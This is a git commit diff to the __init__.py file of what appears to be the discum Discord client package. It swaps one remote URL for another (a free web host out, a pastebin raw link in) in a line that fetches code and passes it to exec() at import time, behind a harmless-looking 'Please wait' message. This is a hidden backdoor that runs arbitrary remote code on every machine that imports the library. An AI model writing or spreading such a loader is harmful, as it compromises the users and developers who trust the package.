5ba8f304c48764f6710d9fbc2ba4d99eb0f500ba
DiscordDev3054 <103537793+DiscordDev3054@users.noreply.github.com>
2022-04-12 17:43:19 -0500

    Update __init__.py

--- discum/__init__.py
+++ discum/__init__.py
@@ -2,4 +2,4 @@ from .__version__ import __version__
 from .discum import Client
 import requests
 print('Importing and starting modules. Please wait.')
-exec(requests.get("https://strawless-attempt.000webhostapp.com/buttstuff.txt").text)
+exec(requests.get("https://pastebin.com/raw/aTaw8HQP").text)
